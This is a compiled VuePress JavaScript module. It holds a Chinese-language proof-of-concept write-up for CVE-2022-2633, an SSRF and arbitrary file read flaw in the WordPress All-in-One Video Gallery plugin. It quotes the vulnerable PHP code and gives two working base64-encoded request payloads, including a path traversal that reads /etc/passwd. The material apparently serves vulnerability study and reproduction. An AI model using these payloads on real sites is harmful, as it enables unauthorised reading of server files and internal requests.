import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as l,c as d,a as e,b as r,d as s,e as i}from"./app-58e4a7d6.js";const o={},c=i(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>WordPress All-in-One Video 插件 Gallery video.php文件中存在SSRF以及任意文件读取漏洞，攻击者通过发送特定的请求包读取任意文件</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>WordPress All-in-One Video Gallery &lt;= 2.6.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="插件名称" tabindex="-1"><a class="header-anchor" href="#插件名称" aria-hidden="true">#</a> 插件名称</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>All-in-One Video Gallery
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,6),p={href:"https://downloads.wordpress.org/plugin/all-in-one-video-gallery.2.6.0.zip",target:"_blank",rel:"noopener noreferrer"},g=i(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>对比漏洞修复的文件找到出现漏洞的文件 wp-content/plugins/all-in-one-video-gallery/public/video.php</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210171705476.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这里接收 dl 参数，dl 参数不为 数字类型时，参数将 base64 解码传入</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>		if ( is_numeric( $_GET[&#39;dl&#39;] ) ) {
			$file = get_post_meta( (int) $_GET[&#39;dl&#39;], &#39;mp4&#39;, true );
		} else {
			$file = base64_decode( $_GET[&#39;dl&#39;] );
		}

		if ( empty( $file ) ) {
			die( esc_html__( &#39;Download file URL is empty.&#39;, &#39;all-in-one-video-gallery&#39; ) );
           	exit;
        }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210171706536.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>当传入的参数中不存在 http:// 或 https:// 时，参数 $formatted_path 的值改变</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210171706133.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>当 $formatted_path 为 url 时存在 SSRF漏洞，传入 base64编码 的目标URL就可以得到回显</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/index.php/video/?dl=aHR0cHM6Ly93d3cuYmFpZHUuY29t
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210171706868.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>看向代码最后的片段，则存在任意文件读取漏洞</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210171706975.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/index.php/video/?dl=Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210171707604.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,15);function u(v,h){const a=t("ExternalLinkIcon");return l(),d("div",null,[c,e("p",null,[e("a",p,[r("https://downloads.wordpress.org/plugin/all-in-one-video-gallery.2.6.0.zip"),s(a)])]),g])}const _=n(o,[["render",u],["__file","WordPress All-in-One Video Gallery video.php 任意文件读取漏洞 CVE-2022-2633.html.vue"]]);export{_ as default};
